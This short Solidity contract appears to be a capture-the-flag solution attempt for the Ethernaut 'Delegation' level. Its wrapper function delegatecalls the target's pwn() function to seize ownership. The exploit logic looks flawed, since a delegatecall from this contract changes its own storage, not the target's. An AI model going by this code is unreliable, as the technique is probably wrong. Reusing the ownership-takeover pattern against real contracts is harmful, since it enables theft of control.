pragma solidity ^0.8.0;

contract Ethernaught6 {

    address public owner = <my_address>;
    address ethernaught6 = <Delegation_contract_address>;
    function wrapper() public {
        (bool success,) = ethernaught6.delegatecall(abi.encodeWithSignature("pwn()"));
    }
}
